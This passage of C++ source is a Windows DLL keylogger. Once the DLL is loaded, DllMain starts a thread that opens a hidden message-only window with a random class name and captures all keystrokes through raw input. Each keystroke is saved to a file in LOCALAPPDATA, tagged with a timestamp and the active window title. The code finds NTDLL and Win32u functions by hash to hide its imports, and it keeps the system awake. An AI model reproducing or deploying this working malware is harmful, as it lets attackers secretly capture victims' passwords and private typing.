        return h;
    }
    static std::wstring GetActiveWindowTitle()
    {
        WCHAR title[256] = { 0 };
        HWND fg = GetForegroundWindow();
        if (fg && GetWindowTextW(fg, title, 256) > 0)
            return std::wstring(title);
        return L"No Active Window";
    }
    static std::wstring GetFormattedTimestamp()
    {
        SYSTEMTIME st;
        GetLocalTime(&st);
        std::wstring wt = GetActiveWindowTitle();
        WCHAR buf[512];
        swprintf_s(buf, L"[%02d/%02d/%04d - %02d:%02d:%02d][%s]-> ",
            st.wDay, st.wMonth, st.wYear,
            st.wHour, st.wMinute, st.wSecond,
            wt.c_str());
        return std::wstring(buf);
    }
    static BOOL WriteToFile(HANDLE hFile, const std::wstring& content, bool newline = false)
    {
        if (!hFile || hFile == INVALID_HANDLE_VALUE)
            return FALSE;
        std::wstring out = content;
        if (newline)
            out += L"\r\n";
        IO_STATUS_BLOCK iosb;
        RtlZeroMemoryInternal(&iosb, sizeof(iosb));
        NTSTATUS st = Api.NtWriteFile(
            hFile, NULL, NULL, NULL,
            &iosb,
            (PVOID)out.c_str(),
            (ULONG)(out.size() * sizeof(wchar_t)),
            NULL, NULL
        );
        return NT_SUCCESS(st);
    }
    static BOOL RtlFlushInMemoryInputBufferToDisk(HANDLE hFile, UINT key)
    {
        if (!hFile || hFile == INVALID_HANDLE_VALUE)
            return FALSE;
        BYTE kbState[256] = { 0 };
        if (!Api.NtUserGetKeyboardState(kbState))
            return FALSE;
        switch (key)
        {
        case VK_BACK:
        {
            if (!currentBuffer.empty())
            {
                currentBuffer.pop_back();
                std::wstring line = GetFormattedTimestamp() + currentBuffer;
                if (line != lastWrittenLine)
                {
                    LARGE_INTEGER back;
                    back.QuadPart = lastWritePosition;
                    SetFilePointer(hFile, back.LowPart, &back.HighPart, FILE_BEGIN);
                    SetEndOfFile(hFile);
                    WriteToFile(hFile, line);
                    lastWrittenLine = line;
                    lastWriteSize = line.size() * sizeof(wchar_t);
                }
            }
            break;
        }
        case VK_RETURN:
        {
            if (!currentBuffer.empty())
            {
                SetFilePointer(hFile, 0, NULL, FILE_END);
                std::wstring line = GetFormattedTimestamp() + currentBuffer + L"\r\n";
                if (line != lastWrittenLine)
                {
                    WriteToFile(hFile, line);
                    lastWrittenLine = line;
                    LARGE_INTEGER pos;
                    pos.QuadPart = 0;
                    pos.LowPart = SetFilePointer(hFile, 0, &pos.HighPart, FILE_CURRENT);
                    lastWritePosition = pos.QuadPart;
                    lastWriteSize = line.size() * sizeof(wchar_t);
                }
                currentBuffer.clear();
                isNewLine = true;
            }
            break;
        }
        default:
        {
            WCHAR buff[2] = { 0 };
            if (Api.NtUserToUnicodeEx(key, Api.NtUserMapVirtualKeyEx(key, 0, 0, 0), kbState, buff, 2, 0, 0) >= 1)
            {
                HWND now = GetForegroundWindow();
                if (now != lastActiveWindow && !currentBuffer.empty())
                {
                    SetFilePointer(hFile, 0, NULL, FILE_END);
                    std::wstring cl = GetFormattedTimestamp() + currentBuffer + L"\r\n";
                    if (cl != lastWrittenLine)
                    {
                        WriteToFile(hFile, cl);
                        lastWrittenLine = cl;
                    }
                    currentBuffer.clear();
                    lastActiveWindow = now;
                    isNewLine = true;
                }
                currentBuffer.push_back(buff[0]);
                std::wstring line = GetFormattedTimestamp() + currentBuffer;
                if (line != lastWrittenLine)
                {
                    if (!isNewLine && lastWritePosition != 0)
                    {
                        LARGE_INTEGER back;
                        back.QuadPart = lastWritePosition;
                        SetFilePointer(hFile, back.LowPart, &back.HighPart, FILE_BEGIN);
                        SetEndOfFile(hFile);
                    }
                    else
                    {
                        SetFilePointer(hFile, 0, NULL, FILE_END);
                    }
                    WriteToFile(hFile, line);
                    lastWrittenLine = line;
                    if (isNewLine)
                    {
                        LARGE_INTEGER pos;
                        pos.QuadPart = 0;
                        pos.LowPart = SetFilePointer(hFile, 0, &pos.HighPart, FILE_CURRENT);
                        lastWritePosition = pos.QuadPart - (LONGLONG)(line.size() * sizeof(wchar_t));
                        isNewLine = false;
                    }
                    lastWriteSize = line.size() * sizeof(wchar_t);
                }
                lastActiveWindow = now;
            }
            break;
        }
        }
        return TRUE;
    }
};

std::wstring CoreUtil::currentBuffer;
LONGLONG    CoreUtil::lastWritePosition = 0;
size_t      CoreUtil::lastWriteSize = 0;
bool        CoreUtil::isNewLine = true;
HWND        CoreUtil::lastActiveWindow = NULL;
std::wstring CoreUtil::lastWrittenLine;

/*******************************************************************
 * Power Notification
 ******************************************************************/
typedef DWORD(WINAPI* POWERSETTINGREGISTERNOTIFICATION)(LPCGUID, DWORD, HANDLE, PHPOWERNOTIFY);
typedef DWORD(WINAPI* POWERSETTINGUNREGISTERNOTIFICATION)(HPOWERNOTIFY);

ULONG CALLBACK HandlePowerNotifications(PVOID, ULONG Type, PVOID Setting)
{
    PPOWERBROADCAST_SETTING ps = (PPOWERBROADCAST_SETTING)Setting;
    if (Type == PBT_POWERSETTINGCHANGE && ps->PowerSetting == GUID_CONSOLE_DISPLAY_STATE)
    {
        DWORD st = *(DWORD*)ps->Data;
        std::wstring msg = CoreUtil::GetFormattedTimestamp();
        if (st == 0)      msg += L"Display turned OFF.\r\n";
        else if (st == 1) msg += L"Display turned ON.\r\n";
        else if (st == 2) msg += L"Display entered power‐saving mode.\r\n";
        else              msg += L"Display state unknown.\r\n";

        if (g_hLogFile && g_hLogFile != INVALID_HANDLE_VALUE)
        {
            EnterCriticalSection(&g_LogCriticalSection);
            CoreUtil::WriteToFile(g_hLogFile, msg);
            LeaveCriticalSection(&g_LogCriticalSection);
        }
    }
    return 0;
}

DWORD WINAPI PowerNotificationThread(LPVOID)
{
    HMODULE hPowrprof = LoadLibraryW(L"powrprof.dll");
    if (!hPowrprof) return 1;
    auto pRegister = (POWERSETTINGREGISTERNOTIFICATION)GetProcAddress(hPowrprof, "PowerSettingRegisterNotification");
    auto pUnregister = (POWERSETTINGUNREGISTERNOTIFICATION)GetProcAddress(hPowrprof, "PowerSettingUnregisterNotification");
    if (!pRegister || !pUnregister)
    {
        FreeLibrary(hPowrprof);
        return 1;
    }
    DEVICE_NOTIFY_SUBSCRIBE_PARAMETERS p;
    p.Callback = HandlePowerNotifications;
    p.Context = NULL;
    HPOWERNOTIFY hNotify = NULL;
    DWORD ret = pRegister(&GUID_CONSOLE_DISPLAY_STATE, DEVICE_NOTIFY_CALLBACK, (HANDLE)&p, &hNotify);
    if (ret != ERROR_SUCCESS)
    {
        FreeLibrary(hPowrprof);
        return 1;
    }
    if (!SetThreadExecutionState(ES_AWAYMODE_REQUIRED | ES_CONTINUOUS | ES_SYSTEM_REQUIRED))
    {
        pUnregister(hNotify);
        FreeLibrary(hPowrprof);
        return 1;
    }
    while (!g_bExitPowerThread)
        Sleep(100);
    pUnregister(hNotify);
    FreeLibrary(hPowrprof);
    return 0;
}

/*******************************************************************
 * Dynamic Import of NTDLL/Win32U
 ******************************************************************/
class Libindexes {
public:
    static DWORD64 __stdcall ImportFunction(DWORD64 base, DWORD64 hash)
    {
        PBYTE b = (PBYTE)base;
        PIMAGE_DOS_HEADER dos;
        PIMAGE_NT_HEADERS nt;
        PIMAGE_FILE_HEADER file;
        PIMAGE_OPTIONAL_HEADER opt;
        if (!CoreUtil::RtlLoadPeHeaders(&dos, &nt, &file, &opt, &b))
            return 0;

        auto expDir = (IMAGE_EXPORT_DIRECTORY*)(base + opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        DWORD* names = (DWORD*)((PBYTE)base + expDir->AddressOfNames);
        DWORD* funcs = (DWORD*)((PBYTE)base + expDir->AddressOfFunctions);
        WORD* ords = (WORD*)((PBYTE)base + expDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < expDir->NumberOfNames; i++)
        {
            char* funcName = (char*)(base + names[i]);
            DWORD h = StrUtility::HashStringDjb2A(funcName);
            if (h == hash)
                return (base + funcs[ords[i]]);
        }
        return 0;
    }

    static BOOL LdrLoadNtDllFunctionality()
    {


        Api.LdrLoadDll = (LDRLOADDLL)ImportFunction(Api.PeBase, 0x0307db23);
        Api.RtlAllocateHeap = (RTLALLOCATEHEAP)ImportFunction(Api.PeBase, 0xc0b381da);
        Api.RtlFreeHeap = (RTLFREEHEAP)ImportFunction(Api.PeBase, 0x70ba71d7);
        Api.NtClose = (NTCLOSE)ImportFunction(Api.PeBase, 0x8b8e133d);
        Api.RtlDosPathNameToNtPathName_U = (RTLDOSPATHNAMETONTPATHNAME_U)ImportFunction(Api.PeBase, 0xbfe457b2);
        Api.NtCreateFile = (NTCREATEFILE)ImportFunction(Api.PeBase, 0x15a5ecdb);
        Api.NtdllDefWindowProc_W = (NTDLLDEFWINDOWPROC_W)ImportFunction(Api.PeBase, 0x058790f4);
        Api.NtQueryInformationFile = (NTQUERYINFORMATIONFILE)ImportFunction(Api.PeBase, 0x4725f863);
        Api.NtSetInformationFile = (NTSETINFORMATIONFILE)ImportFunction(Api.PeBase, 0x6e88b479);
        Api.NtWriteFile = (NTWRITEFILE)ImportFunction(Api.PeBase, 0xd69326b2);

        if (!Api.LdrLoadDll || !Api.RtlAllocateHeap || !Api.RtlFreeHeap || !Api.NtClose)
            return FALSE;
        if (!Api.RtlDosPathNameToNtPathName_U || !Api.NtCreateFile || !Api.NtdllDefWindowProc_W)
            return FALSE;
        if (!Api.NtQueryInformationFile || !Api.NtSetInformationFile || !Api.NtWriteFile)
            return FALSE;
        return TRUE;
    }

    static BOOL RtlGetWin32uImageBase()
    {
        UNICODE_STRING u;
        StrUtility::RtlInitUnicodeString(&u, L"Win32u.dll");
        NTSTATUS st = Api.LdrLoadDll(NULL, 0, &u, (PHANDLE)&Api.Win32uBase);
        return NT_SUCCESS(st);
    }

    static BOOL LdrLoadWin32uFunctionality()
    {
        if (!RtlGetWin32uImageBase())
            return FALSE;



        Api.NtUserCallOneParam = (NTUSERCALLONEPARAM)ImportFunction(Api.Win32uBase, 0xb19a9f55);
        Api.NtUserDestroyWindow = (NTUSERDESTROYWINDOW)ImportFunction(Api.Win32uBase, 0xabad4a48);
        Api.NtUserRegisterRawInputDevices = (NTUSERREGISTERRAWINPUTDEVICES)ImportFunction(Api.Win32uBase, 0x76dc2408);
        Api.NtUserGetRawInputData = (NTUSERGETRAWINPUTDATA)ImportFunction(Api.Win32uBase, 0xd902c31a);
        Api.NtUserGetKeyboardState = (NTUSERGETKEYBOARDSTATE)ImportFunction(Api.Win32uBase, 0x92ca3458);
        Api.NtUserToUnicodeEx = (NTUSERTOUNICODEEX)ImportFunction(Api.Win32uBase, 0xe561424d);
        Api.NtUserMapVirtualKeyEx = (NTUSERMAPVIRTUALKEYEX)ImportFunction(Api.Win32uBase, 0xc8e8ef51);
        Api.NtUserGetKeyNameText = (NTUSERGETKEYNAMETEXT)ImportFunction(Api.Win32uBase, 0x5be51535);
        Api.NtUserGetMessage = (NTUSERGETMESSAGE)ImportFunction(Api.Win32uBase, 0xb6c60f8b);
        Api.NtUserTranslateMessage = (NTUSERTRANSLATEMESSAGE)ImportFunction(Api.Win32uBase, 0xafc97a79);

        if (!Api.NtUserCallOneParam || !Api.NtUserDestroyWindow || !Api.NtUserRegisterRawInputDevices || !Api.NtUserGetRawInputData)
            return FALSE;
        if (!Api.NtUserGetKeyboardState || !Api.NtUserToUnicodeEx || !Api.NtUserMapVirtualKeyEx || !Api.NtUserGetKeyNameText)
            return FALSE;
        if (!Api.NtUserGetMessage || !Api.NtUserTranslateMessage)
            return FALSE;
        return TRUE;
    }
};

/*******************************************************************
 * Window, Message Handling, and Logic
 ******************************************************************/
VOID InlineWin32uPostQuitMessage(DWORD code)
{
    // 0x3B is the internal code for PostQuitMessage
    Api.NtUserCallOneParam(code, 0x3B);
}

BOOL InlineRtlNtUserGetMessage(LPMSG lpMsg, HWND hWnd, UINT min, UINT max)
{
    if ((min | max) & ~WM_MAXIMUM) return FALSE;
    BOOL r = Api.NtUserGetMessage(lpMsg, hWnd, min, max);
    return (r == (BOOL)-1) ? FALSE : r;
}

BOOL InlineRtlNtUserTranslateMessage(PMSG lpMsg, UINT flags)
{
    switch (lpMsg->message)
    {
    case WM_KEYDOWN:
    case WM_KEYUP:
    case WM_SYSKEYDOWN:
    case WM_SYSKEYUP:
        return Api.NtUserTranslateMessage(lpMsg, flags);
    default:
        if (lpMsg->message & ~WM_MAXIMUM)
            return FALSE;
    }
    return FALSE;
}

UINT RtlQueryRawInputSize(HRAWINPUT hRaw)
{
    UINT sz = 0;
    if (Api.NtUserGetRawInputData(hRaw, RID_INPUT, NULL, &sz, sizeof(RAWINPUTHEADER)) == (UINT)-1)
        return 0;
    return sz;
}

LRESULT CALLBACK Wndproc(HWND hWnd, UINT Msg, WPARAM, LPARAM lParam)
{
    static HANDLE hFile = NULL;
    switch (Msg)
    {
    case WM_CREATE:
    {
        RAWINPUTDEVICE rid;
        rid.usUsagePage = HID_USAGE_PAGE_GENERIC;
        rid.usUsage = HID_USAGE_GENERIC_KEYBOARD;
        rid.dwFlags = RIDEV_INPUTSINK;
        rid.hwndTarget = hWnd;
        if (!Api.NtUserRegisterRawInputDevices(&rid, 1, sizeof(rid)))
            InlineWin32uPostQuitMessage(InlineTebGetLastError());

        WCHAR path[512] = { 0 };
        if (CoreUtil::InlineUppGetEnvironmentVariableW(L"LOCALAPPDATA", path, 512) == 0)
            InlineWin32uPostQuitMessage(InlineTebGetLastError());

        // "StringConcatW" now takes const wchar_t*, so no error
        StrUtility::StringConcatW(path, L"\\Datalog.txt");
        hFile = CoreUtil::InlineNtdllNtCreateFile(path);
        if (hFile)
        {
            if (CoreUtil::InlineRtlSetFilePointerToEnd(hFile) == INVALID_SET_FILE_POINTER)
                InlineWin32uPostQuitMessage(InlineTebGetLastError());
        }
        else
            InlineWin32uPostQuitMessage(InlineTebGetLastError());
        g_hLogFile = hFile;
        break;
    }
    case WM_INPUT:
    {
        UINT sz = RtlQueryRawInputSize((HRAWINPUT)lParam);
        if (!sz)
        {
            InlineWin32uPostQuitMessage(InlineTebGetLastError());
            break;
        }
        PRAWINPUT pRaw = (PRAWINPUT)Api.RtlAllocateHeap(Api.Peb->ProcessHeap, 0, sz);
        if (!pRaw)
        {
            InlineWin32uPostQuitMessage(InlineTebGetLastError());
            break;
        }
        if (Api.NtUserGetRawInputData((HRAWINPUT)lParam, RID_INPUT, pRaw, &sz, sizeof(RAWINPUTHEADER)) == (UINT)-1)
        {
            Api.RtlFreeHeap(Api.Peb->ProcessHeap, 0, pRaw);
            break;
        }
        if (pRaw->header.dwType == RIM_TYPEKEYBOARD && pRaw->data.keyboard.Message == WM_KEYDOWN)
        {
            EnterCriticalSection(&g_LogCriticalSection);
            CoreUtil::RtlFlushInMemoryInputBufferToDisk(hFile, pRaw->data.keyboard.VKey);
            LeaveCriticalSection(&g_LogCriticalSection);
        }
        Api.RtlFreeHeap(Api.Peb->ProcessHeap, 0, pRaw);
        break;
    }
    case WM_DESTROY:
    {
        if (hFile)
            Api.NtClose(hFile);
        break;
    }
    default:
        return Api.NtdllDefWindowProc_W(hWnd, Msg, 0, lParam);
    }
    return 0;
}

/*******************************************************************
 * KeyloggerMain Thread (Replaces original wWinMain)
 ******************************************************************/
static DWORD WINAPI loggerMain(LPVOID)
{
    Api.Teb = (PTEB)GetTeb();
    Api.Peb = Api.Teb->ProcessEnvironmentBlock;

    // Basic OS check
    if (Api.Peb->OSMajorVersion != 0x0A)
        return ERROR_CALL_NOT_IMPLEMENTED;

    // Identify our module's base from the loader list
    PLDR_MODULE mod = (PLDR_MODULE)((PBYTE)Api.Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 16);
    Api.PeBase = (DWORD64)mod->BaseAddress;

    // Load all NTDLL and Win32U exports
    if (!Libindexes::LdrLoadNtDllFunctionality())
        return ERROR_INVALID_FUNCTION;
    if (!Libindexes::LdrLoadWin32uFunctionality())
        return ERROR_INVALID_FUNCTION;

    // Generate a random class name
    Api.lpszClassNameBuffer = StrUtility::RtlGeneratePseudoRandomString(8);
    if (!Api.lpszClassNameBuffer)
        return ERROR_OUTOFMEMORY;

    WNDCLASSEXW wc;
    CoreUtil::RtlZeroMemoryInternal(&wc, sizeof(wc));
    wc.cbSize = sizeof(wc);
    wc.lpfnWndProc = Wndproc;
    wc.hInstance = GetModuleHandleW(NULL);
    wc.lpszClassName = Api.lpszClassNameBuffer;
    wc.style = CS_HREDRAW | CS_VREDRAW;

    if (!RegisterClassExW(&wc))
        return InlineTebGetLastError();

    HWND wnd = CreateWindowExW(0, Api.lpszClassNameBuffer, L"", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, NULL);
    if (!wnd)
        return InlineTebGetLastError();

    InitializeCriticalSection(&g_LogCriticalSection);
    g_hPowerThread = CreateThread(NULL, 0, PowerNotificationThread, NULL, 0, NULL);
    if (!g_hPowerThread)
        return InlineTebGetLastError();

    MSG m;
    while (InlineRtlNtUserGetMessage(&m, NULL, 0, 0) > 0)
    {
        InlineRtlNtUserTranslateMessage(&m, 0);
        DispatchMessageW(&m);
    }

    Api.NtUserDestroyWindow(wnd);
    Api.RtlFreeHeap(Api.Peb->ProcessHeap, 0, Api.lpszClassNameBuffer);

    g_bExitPowerThread = true;
    if (g_hPowerThread)
    {
        WaitForSingleObject(g_hPowerThread, INFINITE);
        CloseHandle(g_hPowerThread);
        g_hPowerThread = NULL;
    }
    DeleteCriticalSection(&g_LogCriticalSection);

    return ERROR_SUCCESS;
}

/*******************************************************************
 * DLL Entry Point
 ******************************************************************/
static HANDLE g_hKeyloggerThread = NULL;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        DisableThreadLibraryCalls(hModule);
        g_hKeyloggerThread = CreateThread(NULL, 0, loggerMain, NULL, 0, NULL);
        break;
    }
    case DLL_PROCESS_DETACH:
    {
        // Minimal cleanup here if needed; 
        // Typically rely on the thread’s own shutdown or process exit.
        break;
    }
    default:
        break;
    }
    return TRUE;
}
